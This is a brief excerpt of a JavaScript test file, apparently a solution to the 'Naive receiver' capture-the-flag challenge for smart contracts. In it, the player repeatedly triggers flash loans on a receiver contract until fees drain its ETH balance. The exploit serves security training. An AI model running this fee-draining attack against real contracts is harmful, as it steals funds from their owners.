...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Execution', async function () {
        ...
        let fixedFee = await pool.flashFee((await pool.ETH()), amountToLoan);
        while ((await ethers.provider.getBalance(receiver.address)).gte(fixedFee)) { // Keep looping until the receiver has less than the fixed fee. // gte = greater than or equal to
            await pool.connect(player).flashLoan(receiver.address, (await pool.ETH()), amountToLoan, "0x");
        }
    });
